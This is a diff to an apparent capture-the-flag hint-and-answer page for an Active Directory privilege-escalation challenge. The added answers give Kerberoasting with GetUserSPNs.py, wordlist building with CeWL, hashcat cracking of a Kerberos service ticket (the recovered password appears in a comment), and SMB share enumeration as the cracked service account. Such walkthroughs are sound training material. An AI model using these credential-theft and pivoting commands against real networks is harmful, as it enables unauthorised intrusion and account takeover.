@@ -43,16 +43,51 @@ Eve Snowshoe will give you a hint after you finish the HoHoNo Fail2Ban challenge
 </details>
 
 <details>
-  <summary>Escalation or Pivoting - Hint</summary>
+  <summary>Escalation or Pivoting - Hint 1</summary>
   Kerberoasting on a open fire :)
 </details>
 <details>
-  <summary>Escalation or Pivoting - Answer</summary>
+  <summary>Escalation or Pivoting - Answer 1</summary>
   python3 GetUserSPNs.py elfu.local/USER:PASS -outputfile out.txt
+</details>
+<details>
+  <summary>Escalation or Pivoting - Hint 2a</summary>
+  Crack the hash by building a wordlist. But from where?
+</details>
+<details>
+  <summary>Escalation or Pivoting - Hint 2b</summary>
+  Try running cewl with certain flags on the registration page.
+</details>
+<details>
+  <summary>Escalation or Pivoting - Answer 2</summary>
+  git clone https://github.com/digininja/CeWL.git
+  
+  docker build -t cewl .
+  
+  docker run -it --rm -v "${PWD}:/host" cewl -w out.txt --with-numbers https://register.elfu.org/register
+  
+  ./hashcat/hashcat -m 13100 hash.txt CeWL/out.txt --rules OneRuleToRuleThemAll.rule #Snow2021!
+</details>
+
+<details>
+  <summary>Escalation or Pivoting - Hint 3</summary>
+  What does elfu_svc have access to on the network that you do not?
+</details>
+<details>
+  <summary>Escalation or Pivoting - Answer 3</summary>
+
+```
+nmblookup -A 10.128.3.30
+smbclient -L \\SHARE30 -I 10.128.3.30 -N
+smbclient -U elfu_svc -L \\SHARE30 -I 10.128.3.30
+```
 </details>
 
 
-
+<br/>
+<br/>
+<br/>
+<br/>
 ... WARNING ... SPOILERS & ANSWERS BELOW ...
 <br/>
 <br/>
@@ -159,6 +194,6 @@ cat loot.pdf | base64 -d > final.pdf
 
 
 <details>
-  <summary></summary>
+  <summary>REPLACE</summary>
   
 </details>
